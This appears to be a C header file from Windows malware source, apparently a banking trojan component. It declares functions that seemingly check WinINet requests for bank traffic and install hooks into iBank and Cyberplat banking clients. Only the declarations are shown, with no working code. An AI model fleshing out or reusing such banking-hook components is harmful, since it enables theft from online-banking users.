
#ifndef RuBnkH
#define RuBnkH
//----------------------------------------------------------------------------
#include <windows.h>
#include <wininet.h>
#include "Ibank.h"

void IsBank( HINTERNET hRequest );
bool IbankHooksMain();
bool HookCyberplatPCMain();


//----------------------------------------------------------------------------
#endif
